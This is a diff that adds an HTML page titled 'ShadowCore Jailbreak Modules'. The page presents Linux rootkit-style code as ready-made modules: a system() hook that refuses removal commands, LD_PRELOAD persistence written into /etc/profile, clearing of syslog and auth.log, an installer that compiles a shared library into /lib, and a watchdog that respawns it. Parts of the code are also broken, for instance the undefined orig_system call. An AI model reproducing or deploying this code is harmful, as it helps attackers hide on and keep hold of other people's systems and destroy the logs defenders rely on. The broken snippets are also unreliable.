@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>ShadowCore Modules</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
+        .module { border: 1px solid #f00; padding: 15px; margin: 10px; background: #111; }
+        .code { background: #222; padding: 10px; overflow-x: auto; }
+    </style>
+</head>
+<body>
+    <h1>🛠️ ShadowCore Jailbreak Modules</h1>
+    
+    <div class="module">
+        <h3>Module 1: kernel_hook.c</h3>
+        <div class="code">
+#include &lt;dlfcn.h&gt;
+int system(const char *cmd) {
+    if(strstr(cmd, "remove")) return 0;
+    return orig_system(cmd);
+}
+        </div>
+    </div>
+    
+    <div class="module">
+        <h3>Module 2: persistence.c</h3>
+        <div class="code">
+void __attribute__((constructor)) init() {
+    system("echo 'LD_PRELOAD=/lib/shadow.so' >> /etc/profile");
+}
+        </div>
+    </div>
+    
+    <div class="module">
+        <h3>Module 3: cleaner.c</h3>
+        <div class="code">
+void clean_logs() {
+    system("> /var/log/syslog");
+    system("> /var/log/auth.log");
+}
+        </div>
+    </div>
+    
+    <div class="module">
+        <h3>Module 4: installer.sh</h3>
+        <div class="code">
+#!/bin/bash
+gcc -shared -fPIC -o /lib/shadow.so kernel_hook.c
+echo "export LD_PRELOAD=/lib/shadow.so" >> /etc/profile
+        </div>
+    </div>
+    
+    <div class="module">
+        <h3>Module 5: watchdog.sh</h3>
+        <div class="code">
+#!/bin/bash
+while true; do
+    ps aux | grep -v grep | grep -q shadow || /lib/shadow.so &
+    sleep 60
+done
+        </div>
+    </div>
+    
+    <p><a href="index.html" style="color:#0ff;">← Back to Main</a></p>
+</body>
+</html>
